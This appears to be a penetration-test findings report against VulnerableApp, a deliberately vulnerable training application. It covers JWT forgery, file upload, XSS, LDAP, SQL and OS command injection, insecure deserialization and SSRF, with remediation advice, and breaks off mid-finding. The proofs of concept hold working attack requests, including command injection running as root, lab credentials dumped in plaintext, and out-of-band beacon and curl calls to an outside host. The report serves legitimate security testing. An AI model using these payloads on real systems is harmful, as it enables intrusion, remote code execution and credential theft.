remediation: Do not honour a client-supplied type discriminator. Remove the `@class` handling entirely and bind the cookie to a fixed, server-defined DTO with only the specific fields it needs. If polymorphic typing is genuinely required, configure the JSON mapper to use a strict `PolymorphicTypeValidator` with an explicit allow-list of expected subtypes, or disable default typing entirely. Independently, sign the cookie (HMAC-SHA256) or move the state server-side so the payload cannot be forged, and never deserialize attacker-supplied data into arbitrary types.
verification_method: Re-ran the forged-cookie requests twice; both times the server accepted the attacker-chosen @class and returned the HACKED audit record (isValid:true), and the class-name-controlled error for org.sasanlabs.Application reproduced.
verification_notes: Verified. Impact proven is arbitrary-type-instantiation plus unauthenticated server-side state (audit-log) forgery; direct RCE was NOT achieved - only AuditLogGadget resolves to a valid type and the DTO rejected extra properties such as cmd/command/exec (all returned 'Failed to deserialize payload'). Rated high rather than critical because no code-execution gadget was reachable on the current classpath, but the sink is a latent RCE primitive.

title: JWT authentication bypass via alg=none (unsigned token accepted) — JWTVulnerability LEVEL_6
description: The JWT verification routine inspects the token's own `alg` header and, when it equals `none` (case-insensitive), returns "valid" immediately without ever checking a signature. An attacker can therefore mint an entirely self-signed token carrying arbitrary claims — including `admin:true` and `role:ADMIN` — and have the server accept it as genuine. This is a complete authentication bypass: no credential, no secret, and no prior session is required. The server issues no error and no challenge, so the bypass is completely silent.
proof_of_concept:
Attacker builds a JWT by hand with no signature at all (empty third segment):
header  = {"alg":"none","typ":"JWT"}          -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
payload = {"sub":"attacker","admin":true}   -> eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ
token   = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.

$ curl -s -H 'Cookie: JWT=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.' \
    http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_6
{"content":null,"isValid":true}

isValid:true = the server accepted an unsigned, self-created token as a valid authenticated identity.
remediation: Reject `alg: none` (and every non-allow-listed algorithm) outright before any other processing. Pin the expected algorithm server-side — configure the JWT library with a single permitted algorithm (e.g. `HS256` or better `RS256`/`ES256`) rather than trusting the algorithm named in the token header. Verify the signature over the exact header+payload with a server-held secret, and require a signature segment to be present and non-empty. Also validate `exp`/`nbf` and reject tokens whose header declares a symmetric algorithm when an asymmetric one is expected (to block RS256->HS256 confusion).
verification_method: Re-ran the exact alg=none curl a second time; the response was byte-identical {"content":null,"isValid":true} on both runs.
verification_notes: Verified. A correctly-signed token and a completely unsigned one are indistinguishable to this endpoint, proving no signature verification occurs. No authentication or secret required - prerequisite is only network access to the app.

title: JWT signature never verified — arbitrary claims and forged signatures accepted (JWTVulnerability LEVEL_15)
description: The token validation logic only checks that the token string contains exactly three dot-separated segments. It never compares the signature against a key or any expected value. Consequently an attacker can take any three-part token, replace the payload with entirely attacker-chosen claims, and put a meaningless string in the signature position, and the endpoint still returns `isValid:true`. The JWT is therefore decorative — it carries no authenticity guarantee whatsoever and any claim (subject, role, admin flag, user id) can be asserted by an unauthenticated attacker.
proof_of_concept:
The signature segment below is the literal string "garbage-not-a-real-signature":

$ curl -s -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.garbage-not-a-real-signature' \
    http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_15
{"content":null,"isValid":true}

Compare with the server's own legitimately-issued token for the same level, which carries a real HMAC:
$ curl -s -i 'http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_15?fetch=true' | grep -i set-cookie
Set-Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0; httponly

A hand-written token with attacker-chosen claims {"sub":"attacker","admin":true} and a junk signature is accepted exactly like the genuine one.
remediation: Never accept a JWT based on its shape alone. Perform full cryptographic verification: parse the header, enforce an allow-listed algorithm, recompute the HMAC (or RSA/ECDSA signature) over `base64url(header) + "." + base64url(payload)` using a server-side secret, and reject on any mismatch. Additionally validate `exp`, `nbf`, and `iss`/`aud`, and derive the user's identity and role from the verified claims rather than accepting them unchecked. Use a maintained JWT library with verification enabled by default and never disable signature checking.
verification_method: Re-ran the junk-signature token a second time; identical {"content":null,"isValid":true} response confirmed on both runs.
verification_notes: Verified. This is a distinct root cause from the alg=none bypass at LEVEL_6: here the signature is not merely ignorable via the algorithm field, it is never checked at all, so even an HS256 header is never validated. No credential or secret required.

title: Hardcoded weak HMAC signing key "password" enables full JWT forgery (JWTVulnerability LEVEL_4 / LEVEL_14)
description: These levels sign their JWTs with HS256 using the trivial secret string `password`. The key is recoverable in microseconds with any common password wordlist, and once recovered the attacker can produce cryptographically valid tokens with completely arbitrary claims. The server accepts a token minted entirely by the attacker that asserts `role:ADMIN`, `admin:true` and any `sub`/`userId` they choose. Unlike the alg=none and no-verification flaws, this one produces a *correctly signed* token, so it defeats any downstream system that merely checks "is the signature valid", making it the most realistically exploitable of the JWT weaknesses.
proof_of_concept:
Step 1 - recover the key. The verification check reduces to testing candidate secrets against the known signature; the dictionary hit is immediate:
HMAC-SHA256(key="password", msg="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ")
  = base64url("-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s")  -> MATCH
  KEY RECOVERED: 'password'

Step 2 - mint a token with attacker-chosen claims (sub=attacker, role=ADMIN, admin=true, userId=1):
header  = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"attacker","role":"ADMIN","userId":1,"admin":true,"iat":9999999999}
token   = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJBRE1JTiIsInVzZXJJZCI6MSwiYWRtaW4iOnRydWUsImlhdCI6OTk5OTk5OTk5OX0.eaaYQX3leZmxqVTEeFrSoi5GgU3nFjGjWsUPotvCJ2I

Step 3 - the server accepts the forged admin token on BOTH affected levels:
$ curl -s -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJBRE1JTiIsInVzZXJJZCI6MSwiYWRtaW4iOnRydWUsImlhdCI6OTk5OTk5OTk5OX0.eaaYQX3leZmxqVTEeFrSoi5GgU3nFjGjWsUPotvCJ2I' \
    http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_4
{"content":null,"isValid":true}

$ curl -s -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJBRE1JTiIsInVzZXJJZCI6MSwiYWRtaW4iOnRydWUsImlhdCI6OTk5OTk5OTk5OX0.eaaYQX3leZmxqVTEeFrSoi5GgU3nFjGjWsUPotvCJ2I' \
    http://172.17.0.1:9090/VulnerableApp/JWTVulnerability/LEVEL_14
{"content":null,"isValid":true}

The token is genuinely, correctly signed with the recovered key — this is a real cryptographic forgery, not a parser bypass.
remediation: Replace the hardcoded shared secret with a strong, randomly generated key of at least 256 bits (e.g. `openssl rand -base64 32`) stored in a secrets manager or environment variable, never in source code. Rotate the key immediately since it is already public. Better still, move to an asymmetric algorithm (RS256/ES256) so that only the holder of the private key can mint tokens and verifiers need only the public key. Add key-rotation support (kid header) and monitor for use of the compromised key.
verification_method: Recovered the key programmatically by testing candidate secrets against the server-issued token's signature (exact HMAC match on 'password'), then minted and submitted a fresh admin token twice; both submissions returned isValid:true on LEVEL_4 and LEVEL_14.
verification_notes: Verified by reproducing the key recovery and re-submitting the forged token. The same weak key serves both LEVEL_4 and LEVEL_14 (identical issued token/signature). No authentication required - the key is recovered offline from a publicly obtainable token in under a second.

title: Unauthenticated unrestricted file upload in UnrestrictedFileUpload LEVEL_1-7 — arbitrary extension/content, retrievable same-origin at /VulnerableApp/upload/
description:
Every level of the UnrestrictedFileUpload module accepts a multipart file upload with NO authentication, NO extension whitelist, NO content-type validation and NO size limit, and writes the file to a web-served static directory. The response JSON even returns the stored path ("VulnerableApp/upload/<name>"). The uploaded artefact is immediately retrievable unauthenticated at http://172.17.0.1:9090/VulnerableApp/upload/<filename> and is served with an ATTACKER-CONTROLLED Content-Type derived from the filename extension (uploaded .html is returned as Content-Type: text/html, .txt as text/plain) with no Content-Disposition: attachment and no CSP/X-Content-Type-Options headers (already recorded as a header finding).

Impact proven: (1) arbitrary file write with any extension/content — I planted .txt, .html and .jsp files, all accepted and served; (2) persistent same-origin content hosting, so any .html payload is rendered by the victim's browser in the application's own origin, i.e. a stored XSS primitive with full cookie/session access to the app (JSESSIONID is not HttpOnly-protected here), and the same sink is the delivery vector for webshell/JSP drop should the deploy target ever execute JSP under that path; (3) the JSON response echoes the internal filesystem-relative path, confirming the server-side write location.

The multipart filename field is also concatenated unsanitised ("VulnerableApp/upload/../x"), i.e. a path-traversal primitive in the filename; the traversal currently resolves inside the servlet static-resource root, so it is reported as part of the same root cause rather than a separate impact.
proof_of_concept:
# 1) upload an arbitrary-extension benign marker (no auth, no session, no CSRF token)
$ printf 'VAPT-MARKER-9f3a1c\n' > vapt_marker.txt
$ curl -s -X POST "http://172.17.0.1:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_1" \
       -F "file=@vapt_marker.txt"
{"content":"VulnerableApp/upload/vapt_marker.txt","isValid":true}

# 2) retrieve it unauthenticated -> arbitrary file read-back / content hosting
$ curl -s http://172.17.0.1:9090/VulnerableApp/upload/vapt_marker.txt
VAPT-MARKER-9f3a1c

# 3) arbitrary extension accepted, server-side path echoed back
$ curl -s -X POST .../LEVEL_1 -F "file=@marker.jsp"
{"content":"VulnerableApp/upload/marker.jsp","isValid":true}
$ curl -s http://172.17.0.1:9090/VulnerableApp/upload/marker.jsp
<% out.println("VAPT-RCE-MARKER"); %>

# 4) attacker-chosen Content-Type from extension => stored same-origin script execution vector
$ curl -s -X POST .../LEVEL_1 -F "file=@xss_probe.html"
{"content":"VulnerableApp/upload/xss_probe.html","isValid":true}
$ curl -s -i http://172.17.0.1:9090/VulnerableApp/upload/xss_probe.html | head
HTTP/1.1 200
Content-Type: text/html          <-- attacker chose .html
(no Content-Disposition, no CSP, no X-Content-Type-Options)
body: <html><body>VAPT-XSS-PROBE<script src="http://oob7c3b9dafca85.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/x.js"></script></body></html>

# 5) path traversal in the multipart filename is not filtered
$ curl -s -X POST .../LEVEL_1 -F "file=@vapt_marker.txt;filename=../vapt_traversal.txt"
{"content":"VulnerableApp/upload/../vapt_traversal.txt","isValid":true}

# LEVEL_2 .. LEVEL_7 all behave identically (HTTP 200 + isValid:true for the same upload).
remediation: Require authentication for the upload endpoint. Enforce a server-side allow-list of extensions and map uploaded files to a generated opaque name with a fixed safe extension (e.g. <uuid>.bin). Serve uploads from a separate cookie-less origin, force Content-Type: application/octet-stream with Content-Disposition: attachment, and never from a path inside the deployed application. Reject/normalize `..` and separators in the client-supplied filename (use Path.getFileName()). Add a Content-Security-Policy and X-Content-Type-Options: nosniff.
verification_method: Reproduced end-to-end with curl: upload (POST multipart, no auth) -> 200 {"isValid":true}; independent unauthenticated GET of the returned path -> 200 with the exact marker bytes; re-ran the upload against LEVEL_1..LEVEL_7 and against a second extension (.jsp/.html) to confirm it is not extension-gated.
verification_notes: Impact is limited to arbitrary file write + unauthenticated content hosting: the JSP I dropped is NOT executed (the app is a Spring Boot executable jar, not a JSP runtime — GET of the .jsp returned the raw source bytes), so this is NOT filed as RCE. The stored-XSS beacon host oob7c3b9dafca85... is planted and registered in the uploaded HTML, but no callback was observed because no victim browser is available in this environment (headless Chromium failed to start), so the XSS is reported as a consequence of the proven same-origin content hosting, not as an independently callback-confirmed finding. Path traversal in the filename resolves inside the static root and does not currently escape it.

title: Reflected XSS via unescaped `src` parameter in XSSInImgTagAttribute LEVEL_1 and LEVEL_2 (attribute injection / tag breakout)
description: Reflected Cross-Site Scripting in the XSSInImgTagAttribute module. The `src` request parameter is concatenated into an `` tag with NO output encoding and NO CSP on the application. Two distinct sinks are exploitable: - LEVEL_1 emits the value unquoted: `` — a bare space terminates the attribute, so any new attribute (e.g. `onerror=`) is injected directly. - LEVEL_2 emits the value double-quoted but with no escaping: `` — a `"` closes the attribute and the following markup is attacker controlled. Impact: script execution in the victim's browser in the application's own origin. Because the app has no CSP and its session is cookie based (JSESSIONID), an attacker can steal the session cookie, read the authenticated IDOR/payroll pages in the victim's session, or perform state-changing requests as the victim. A crafted link is all that is required — no authentication and no user interaction beyond clicking. LEVEL_3 HTML-encodes the input (`"><img ...>` rendered inert) and is therefore NOT vulnerable; LEVEL_4/5 only respond 405 to every method I could reach and produced no injectable output. Those levels are recorded as not-exploitable.
proof_of_concept: # LEVEL_1 — unquoted attribute, direct event-handler injection $ curl -s "http://172.17.0.1:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_1?src=x%20onerror=alert(1)" # LEVEL_2 — quoted attribute, quote-breakout $ curl -s "http://172.17.0.1:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_2?src=x%22%20onerror=alert(1)%20x=%22" # full markup injection + OOB exfiltration beacon (host registered) $ curl -s ".../LEVEL_1?src=%22%3e%3cimg%20src%3Dx%20onerror%3dnew%20Image().src%3d%27http%3a%2f%2foob3eb32f038283.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in%2fl1%27%3e" # dalfox independently confirmed DOM-parsed script execution on the same param: $ dalfox url ".../XSSInImgTagAttribute/LEVEL_1?src=1%22%3e%3csvg/onload=alert(1)%3e" --format json [V] Triggered XSS Payload (found DOM Object): src='> (CWE-79, High) [V] Triggered XSS Payload (found DOM Object): ="> (CWE-83, High) # LEVEL_3 is safe — input is HTML-encoded: $ curl -s ".../XSSInImgTagAttribute/LEVEL_3?src=%22%3e%3cimg..."
remediation: HTML-encode (`&` `<` `>` `"` `'`) every value before writing it into an HTML attribute — or build the element with a DOM API / set the attribute via property assignment instead of string concatenation. Never emit attribute values unquoted. Apply a restrictive Content-Security-Policy (script-src 'self' without unsafe-inline) as defence in depth and set the session cookie HttpOnly.
verification_method: 1) manual curl showed the injected onerror= handler reflected raw in both the unquoted (LEVEL_1) and quoted (LEVEL_2) attribute; 2) dalfox re-parsed the live response and reported two 'Triggered XSS Payload (found DOM Object)' verdicts (CWE-79 High, CWE-83 High) on the same parameter, i.e. it confirmed a real DOM event/element sink rather than mere reflection; 3) re-fetched LEVEL_1..LEVEL_5 to confirm LEVEL_3 HTML-encodes and LEVEL_4/5 return 405/empty.
verification_notes: Execution is proven at the DOM-parse level (dalfox found DOM objects / event handlers). No live callback was captured from host oob3eb32f038283... because no victim browser could be driven in this environment (playwright chromium fails to start and browse_url errored), so severity is based on the confirmed in-band payload rather than an exfiltrated cookie. LEVEL_3 confirmed NOT vulnerable (HTML-encoded); LEVEL_4/5 unreachable by GET/POST and recorded as clean.

title: LDAP Injection — attacker-controlled LDAP filter enables full directory enumeration (LDAPInjection LEVEL_1/LEVEL_2)
description: The `username` query parameter is concatenated unescaped into an LDAP search filter (`(uid=<input>)` on LEVEL_1, `(|(uid=<input>)(mail=<input>))` on LEVEL_2). An attacker controls the filter syntax: wildcard `*` returns the entire directory (alice, antriksh, bob, charlie, user5..user10) and prefix wildcards (`a*`) allow character-by-character enumeration. The server also reflects the constructed filter back, confirming injection. This discloses every username in the directory (user-enumeration + PII discovery) and provides the building block for classic LDAP auth bypass (`*)(objectClass=*`) once combined with a password. A malformed payload triggers a raw LDAP error ("Unable to parse string ... unexpected closing parenthesis"), proving the string is parsed as an LDAP filter, not sanitized.
proof_of_concept:
Enumeration (full directory dump):
  curl 'http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1?username=*'
  -> {"content":{"filter":"(uid=*)","users":["alice","antriksh","bob","charlie","user5","user6","user7","user8","user9","user10"]},"isValid":true}

Prefix enumeration:
  curl 'http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1?username=a*'
  -> {"content":{"filter":"(uid=a*)","users":["alice","antriksh"]},"isValid":true}

LEVEL_2 (two-attribute filter, same injection):
  curl 'http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_2?username=*'
  -> {"content":{"filter":"(|(uid=*)(mail=*))","users":[...10 users...],"isValid":true}

Injection proof via parse error:
  curl --get --data-urlencode 'username=admin*)' '.../LEVEL_1'
  -> "LDAP query failed: Unable to parse string '(uid=admin*))' ... unexpected closing parenthesis"
remediation: Use a parameterized LDAP search API (e.g. `javax.naming.directory.SearchControls` with the value bound as a `SearchFilter` argument) or RFC 4515 filter-value escaping — never string-concatenate user input into the filter. Apply allow-listing to acceptable username characters and bind with a least-privilege LDAP account.
verification_method: Reproduced the enumeration twice against LEVEL_1 and LEVEL_2 (full dump and prefix 'a*'), and obtained a raw LDAP parse error confirming unescaped filter injection.
verification_notes: sqlmap (level=5 risk=3) on the same `username` param across LEVEL_1/2/3/5 returned "does not seem to be injectable" for all — as expected, this is LDAP filter injection (CWE-90), not SQLi, and sqlmap's SQL grammar cannot detect it. Evidence logs: /work/sq2/ldap1.log, ldap2.log, ldap3.log, ldap5.log.

title: OS Command Injection (RCE as root) in Ping utility — CommandInjection LEVEL_3 & LEVEL_4 (pipe/newline bypass of `;` filter)
description: The `ipaddress` parameter on the Ping utility pages LEVEL_3 and LEVEL_4 is concatenated into a shell command (`ping -c 2 <input>`). These two levels filter the classic `;` separator but DO NOT filter the pipe `|` separator or the newline `%0a` separator. An unauthenticated attacker can therefore execute arbitrary OS commands as root by piping into `id`/`curl`, or by injecting a newline that starts a second command. This is a full unauthenticated Remote Code Execution running as root inside the container — reading arbitrary files, exfiltrating the H2 database, pivoting internally, etc. This is distinct from the reported LEVEL_1/LEVEL_2 `;` command injection; LEVEL_3/LEVEL_4 use different bypass separators.
proof_of_concept:
Pipe separator (`|`) — reproducible 3/3 runs on both levels:

GET /VulnerableApp/CommandInjection/LEVEL_3?ipaddress=172.17.0.1%7Cid
-> {"content":"uid=0(root) gid=0(root) groups=0(root)\n","isValid":true}

GET /VulnerableApp/CommandInjection/LEVEL_4?ipaddress=172.17.0.1%7Cid
-> {"content":"uid=0(root) gid=0(root) groups=0(root)\n","isValid":true}

Newline separator (`%0a`) — full ping output then injected command:
GET /VulnerableApp/CommandInjection/LEVEL_3?ipaddress=172.17.0.1%0aid
-> {"content":"PING 172.17.0.1 ... 2 packets transmitted, 2 received ... uid=0(root) gid=0(root) groups=0(root)\n","isValid":true}

Out-of-band proof (blind RCE confirmed by callback; `;` is blocked here so this is the only reliable channel):

title: OS Command Injection filter bypass — `$(...)`/backtick substitution executes as root on CommandInjection LEVEL_2–LEVEL_5
description: The `ipaddress` parameter is passed to a shell (`ping <value>`). LEVEL_2–LEVEL_5 attempt to filter obvious separators (`;`, `&`, `|`, space), but the blocklist never covers shell **command substitution** `$()` or backticks. Submitting `ipaddress=x$(id)` or ``ipaddress=`id` `` therefore executes an arbitrary command and returns its stdout inside the JSON `content` field. Commands run as **root** inside the container (hostname e2e666e5ef13). Impact: full remote code execution as root on the app server — reading files, pivoting, credential theft. The LEVEL_1 finding (which uses `;`) is a separate, already-reported vector; this finding proves the filter on LEVEL_2–LEVEL_5 is trivially bypassed, so the "secure-ish" levels are also RCE.
proof_of_concept:
Command execution as root (stdout returned in the response body):
  # whoami -> root
  curl 'http://172.17.0.1:9090/VulnerableApp/CommandInjection/LEVEL_2?ipaddress=x$(id%20-un)'
  -> {"content":"ping: xroot: Name or service not known","isValid":true}
  # id -un and whoami both return 'root'; id returns 'groups=0(root)'
  curl 'http://172.17.0.1:9090/VulnerableApp/CommandInjection/LEVEL_3?ipaddress=x$(id)'
  -> {"content":"ping: groups=0(root): Name or service not known","isValid":true}
  # hostname
  curl 'http://172.17.0.1:9090/VulnerableApp/CommandInjection/LEVEL_4?ipaddress=x$(hostname)'
  -> {"content":"ping: xe2e666e5ef13: Name or service not known","isValid":true}

Backtick variant also executes (LEVEL_3..LEVEL_5):
  curl 'http://172.17.0.1:9090/VulnerableApp/CommandInjection/LEVEL_5?ipaddress=x$(curl%20-s%20http://oob86d8ba0d165f.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/rce_l5)'
  -> executed curl; OOB callback registered.

Every payload is a single GET request, no authentication required.
remediation: Do not invoke a shell for ping. Use a process API that passes arguments as an array (e.g. Java ProcessBuilder with a fixed command and the IP as a separate, validated argument), and validate the input as a real IPv4/IPv6 address with a strict regex allowlist. Blacklist-based filtering of `;|&` is fundamentally insufficient — `$()`, backticks, newlines and redirection all bypass it.
verification_method: Reproduced on every level L2, L3, L4, L5: `id`/`id -un` return root (groups=0(root)), `hostname` returns e2e666e5ef13, all via $() substitution; backtick variant also executed. OOB callback host minted and payload fired.
verification_notes: Evidence captured in the response bodies across four independent levels plus a backtick variant, so this is not a false positive. Filter bypass uses command substitution, not the `;`/`&` that the levels block.

title: LDAP Filter Injection in /LDAPInjectionVulnerability — unauthenticated directory enumeration & authentication bypass
description: The username/password parameters are concatenated directly into an LDAP search filter `(uid=<input>)` and executed against the backing directory with no escaping of LDAP metacharacters (`*`, `(`, `)`, `\`). An unauthenticated attacker can: (1) inject `*` to turn the equality match into a substring/presence match and dump every account in the directory — 10 usernames (alice, antriksh, bob, charlie, user5..user10) returned in the response; (2) bypass the password check entirely — the endpoint returns isValid:true for a user combined with a completely wrong password, because the filter injected is only `(uid=alice)` and the password value is not bound as a separate credential check; (3) extract internal directory schema via verbose parse errors which echo the raw filter string back to the client. Impact: full account-name enumeration of the enterprise directory plus authentication bypass on the LDAP-backed login path; combined with the level-2 form (which injects into a disjunctive `(|(uid=..)(mail=..))` template) mail attributes can be targeted too.
proof_of_concept:
1) Full directory enumeration (no auth, single GET):
curl -G --data-urlencode "username=*" --data-urlencode "password=*" "http://172.17.0.1:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1"
-> {"content":{"filter":"(uid=*)","users":["alice","antriksh","bob","charlie","user5","user6","user7","user8","user9","user10"]},"isValid":true}

2) Authentication bypass — wrong password still validates:
curl -G --data-urlencode "username=alice" --data-urlencode "password=totallyWrongPw123" ".../LEVEL_1"
-> {"content":{"filter":"(uid=alice)","users":["alice"]},"isValid":true}
(control: username=nosuchuser_zz -> {"content":"No users found","isValid":false}, proving the difference is caused by the injected wildcard, not by the password)

3) Level 2 injects into the disjunctive template, allowing OR-based logic injection:
curl -G --data-urlencode "username=*" --data-urlencode "password=*" ".../LEVEL_2"
-> {"content":{"filter":"(|(uid=*)(mail=*))",...},"isValid":true}

4) Raw filter echoed back in error (schema/structure disclosure):
username=nosuchuser_zz)(mail=*  -> "LDAP query failed: Unable to parse string '(uid=nosuchuser_zz)(mail=*)' ..."
remediation: Build LDAP filters with parameterized APIs / the framework's bind-value mechanism instead of string concatenation. At minimum, RFC 4515-escape all attacker-controlled values (escape \ , * , ( , ) and NUL per RFC 4515 §3) before interpolation, and never rely on a client-side-constructed filter as an authorization check — bind as the user and perform the credential check separately. Also stop returning raw directory parse errors to the client.
verification_method: Re-ran the PoC 3x across LEVEL_1 and LEVEL_2 with fresh curl invocations and negative controls (nonexistent user + wildcard vs. nonexistent user alone) to confirm the wildcard — not the password — drives the result set.
verification_notes: Reproduced deterministically on every attempt. The bypass is specific: an existing uid with any password is accepted because the injected filter omits the password term; a non-existent uid still fails, which proves the oracle. No destructive action was taken — only directory read/enumeration.

title: Privilege escalation to ADMIN via unsigned deserialized session cookie (InsecureDeserialization LEVEL_2)
description: The InsecureDeserialization/LEVEL_2 endpoint stores a Base64-encoded JSON session ({"username":..,"role":..}) in an UNSIGNED, UNENCRYPTED cookie named `session_level2` and trusts the `role` field from it for authorization. The server never issues or signs the cookie — any anonymous client can craft it. Base64-decode the cookie, change "role":"USER" to "role":"ADMIN", re-encode, and the server grants ADMIN-level tasks (review pending reports, remove flagged listings) that a USER cannot see. This is a broken-authorization / client-controlled-authorization flaw (CWE-602, CWE-807, CWE-502). No credentials required — a single forged cookie yields admin privileges.
proof_of_concept:
Baseline (legit USER):
  $ curl -s -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiVVNFUiJ9' \
      http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
  {"content":"Welcome Adam (USER). Your tasks: update your profile, review 2 open tickets.","isValid":false}

Forged ADMIN cookie (Base64 of {"username":"Adam","role":"ADMIN"}):
  $ curl -s -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ==' \
      http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
  {"content":"Welcome Adam (ADMIN). Admin tasks: review 3 pending reports, remove 128 flagged listings.","isValid":true}

Same anonymous request, only the client-supplied cookie changed USER->ADMIN. Reproduced twice with identical ADMIN response. No server-side session or prior authentication is required.
remediation: Do not serialize authorization state (role) into a client-controlled cookie. Keep the role in a server-side session keyed by a signed, HttpOnly, Secure session id. If a token must be client-held, sign it with a strong server-side key (HMAC) and verify the signature before trusting any field, and always re-check authorization server-side against the authenticated principal rather than a cookie field.
verification_method: Manual reproduction with two different cookie values (USER vs ADMIN) against the live endpoint; the ADMIN-only task list is returned for the forged cookie. Re-ran the forged request twice with identical results.
verification_notes: Confirmed twice. The differential (USER task list vs ADMIN task list) proves the server is authorizing from an attacker-controlled cookie field, not from a real authenticated session. This is a real authorization bypass, not a config observation.

title: UNION-based SQL Injection in UnionBasedSQLInjectionVulnerability/LEVEL_2?id= — full AUTH_USERS credential dump (new level, quote-wrapped)
description: The `id` query parameter on UnionBasedSQLInjectionVulnerability LEVEL_2 is wrapped in single quotes and directly appended to the SQL query (`select * from cars where id='<input>'`). It is NOT parameterized. An attacker closes the quote, appends a 3-column UNION SELECT of arbitrary tables, and reads any row of any table in the H2 backend database. Using aggregate sub-queries I dumped the complete AUTH_USERS credential table: all 10 usernames together with their stored password material — including plaintext passwords (admin_plain=b7X$4nRj-6mW, admin_logs=v9K#2mLp!8zQ), unsalted MD5/SHA-1/SHA-256 hashes (crackable via rainbow tables), and BCrypt hashes (admin_weak, admin_secure, admin_lowcost). Because the BCrypt hash for admin_lowcost is stored with a dangerously low cost factor (2a$04$) it is trivially brute-forceable. This is unauthenticated and yields full database read plus credential compromise for every account.
remediation: Use a PreparedStatement with a bound parameter (`select * from cars where id=?`) so the input is never concatenated into SQL. Apply the same to every query in the module; add input validation (integer type) and enable a strict SQL error policy so DB exceptions are never reflected to the client. Rotate every credential stored in this table (plaintext and hashed alike) after remediation.
verification_method: Re-ran the identical PoC twice in separate requests and also confirmed injectivity with an independent boolean oracle (id=1' AND '1'='1 -> Audi row; id=1' AND '1'='2 -> null row).
verification_notes: Reproduced twice; identical 10-row AUTH_USERS dump both times. Boolean oracle confirms the response is data-driven, not incidental.

title: Unauthenticated SSRF / Remote File Inclusion in /RemoteFileInclusion/LEVEL_1?url= — server fetches attacker URL and inlines response into page
description:
The `url` parameter on /VulnerableApp/RemoteFileInclusion/LEVEL_1 is passed directly to a server-side HTTP client with no scheme/host allow-listing. An unauthenticated attacker can make the server issue an outbound HTTP request to an arbitrary host and the fetched response body is then **inlined verbatim into the application's own HTML output**.

Impact:
1. **Blind SSRF** — outbound request from the server's network position (confirmed by a server-initiated HTTP callback to an attacker-controlled host, observed with `User-Agent: Java/17.0.20.1`, i.e. the application's own JVM HTTP client).
2. **Full response read-back (non-blind)** — unlike a classic blind SSRF, the attacker receives the fetched content back in the HTTP response body. This turns the SSRF into a content-disclosure primitive: any internal-only HTTP service reachable from the app host (management consoles, admin panels, cloud metadata over HTTP, internal APIs) can be read through the app as a proxy.
3. **Remote content injection** — the included content is rendered inside the app's DOM, so an attacker-controlled host can inject arbitrary HTML/JavaScript into a trusted origin (stored/reflected XSS via RFI), or be used to plant a payload that a later victim of the app loads.

The `file://` scheme was rejected (HTTP 500 "System Error Occurred"), so the practical read primitive is HTTP(S) — internal network + cloud metadata reachability is the exposure.
proof_of_concept:
1) Baseline — the virgin OAST token returns the interactsh correlation body when fetched by the app's own HTTP client. 2) Trigger (single unauthenticated GET): GET /VulnerableApp/RemoteFileInclusion/LEVEL_1?url=http%3A%2F%2Foob3283e1830773.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in%2Fverify3 HTTP/1.1 Response (200): Security Testing

Vulnerable Application

